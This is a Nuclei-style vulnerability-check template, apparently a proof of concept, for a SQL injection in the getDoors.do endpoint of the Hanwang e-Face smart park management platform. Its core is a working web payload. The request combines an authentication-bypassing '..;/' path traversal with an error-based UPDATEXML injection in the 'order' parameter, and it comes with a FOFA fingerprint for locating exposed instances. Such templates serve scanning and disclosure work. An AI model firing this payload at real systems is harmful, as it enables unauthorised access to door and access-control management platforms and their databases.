id: poc-yaml-hw-e-face-pass-spmp-getdoors-do-sqli
info:
  name: 汉王e脸通智慧园区管理平台 getDoors.do SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: e脸通智慧园区管理平台
    fofa: icon_hash="1380907357"

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        GET /manage/intercom/..;/..;/manage/firstPeopleOpen/getDoors.do?page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x2e,md5({{t1}}),(SELECT+(ELT(2920=2920,1))),0x71706b7671),8357)) HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "success"
          - "XPATH syntax error"
          - "java.sql.SQLException"
          - "{{t2}}"
        part: body
